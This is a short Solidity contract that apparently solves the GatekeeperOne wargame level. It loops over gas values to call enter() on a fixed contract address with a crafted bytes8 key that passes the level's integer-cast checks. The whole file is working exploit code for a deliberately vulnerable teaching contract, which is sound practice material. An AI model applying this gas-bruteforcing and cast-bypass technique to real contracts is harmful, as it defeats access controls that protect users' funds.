pragma solidity ^0.6.0;

contract Caller {
  constructor() public {
     // 0x000000010000a673 => getBytes(getUintAddr("0x5bDFbE7577335F97fF7172406c3E72f00792A673"))
     // looping over 8191 to calculate the exact gas needed for gateTwo check
     for (uint256 i = 0; i <= 8191; i++) {
       try GatekeeperOne(0xC17F3980a3740B38DAb5468b3205f61042ac430A).enter{gas: 589753}(0x000000010000a673) {
         break;
      } catch {}
    }
  }

  function getUintAddr(address _addr) external pure returns(uint256) {
    return uint256(_addr);
  }

  // appended bytes8(uint64(1) << 32 before the key to satisfy `uint32(uint64(_gateKey)) != uint64(_gateKey)` condition.
  function getBytes(uint256 _key) external pure returns(bytes8) {
    return bytes8(uint64(1) << 32 | uint64(uint16(_key)));
  }
}


